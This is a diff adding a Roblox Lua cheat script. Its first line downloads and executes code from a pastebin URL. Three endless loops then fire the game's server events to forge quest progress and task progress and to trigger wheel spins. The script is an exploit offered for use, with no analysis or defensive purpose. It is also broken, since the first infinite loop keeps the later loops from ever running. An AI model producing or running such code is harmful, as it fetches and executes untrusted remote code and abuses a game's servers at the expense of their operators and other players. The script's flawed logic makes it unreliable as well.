@@ -1,0 +1,30 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/vViq08jX'))()
+
+while true do
+local args = {
+    [1] = 1500
+}
+
+game:GetService("ReplicatedStorage").Events.ForServer.UpdQuest4:FireServer(unpack(args))
+
+wait(1)
+end
+
+while true do
+local args = {
+    [1] = "Freeze",
+    [2] = 2250
+}
+
+game:GetService("ReplicatedStorage").Events.ForServer.TaskProgress:FireServer(unpack(args))
+wait(1)
+end
+
+while true do
+local args = {
+    [1] = game:GetService("Players").LocalPlayer.PlayerGui.Main.Menus.SpinFrame.SpinWheel
+}
+
+game:GetService("ReplicatedStorage").Events.ForServer.AttemptSpin:FireServer(unpack(args))
+wait(1)
+end
